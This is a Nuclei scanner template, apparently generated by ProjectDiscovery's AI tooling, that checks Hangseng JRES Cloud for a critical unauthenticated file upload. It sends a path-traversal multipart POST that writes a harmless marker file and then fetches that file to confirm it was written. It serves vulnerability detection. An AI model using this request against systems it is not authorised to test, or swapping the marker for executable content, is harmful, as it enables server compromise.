id: hangseng-jrescloud-uploadimage-fileupload

info:
  name: Hangseng JRES UploadImage File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  boundary: "{{rand_base(8)}}"
  fname: "{{rand_base(8)}}"
  fcontent: "{{md5(fname)}}"

http:
  - id: upload-file
    raw:
      - |
        POST /acm/api/v1/../../see/view/uploadImage.json HTTP/1.1
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="fileName"

        {{fname}}.txt
        --{{boundary}}
        Content-Disposition: form-data; name="fileUrl"

        /
        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{fname}}.txt"
        Content-Type: image/jpeg

        {{fcontent}}
        --{{boundary}}--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/home/see_center/tomcat/webapps/acm/"
          - "{{fname}}"

  - id: verify-upload
    method: GET
    path:
      - /acm/{{fname}}.txt

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{fcontent}}"
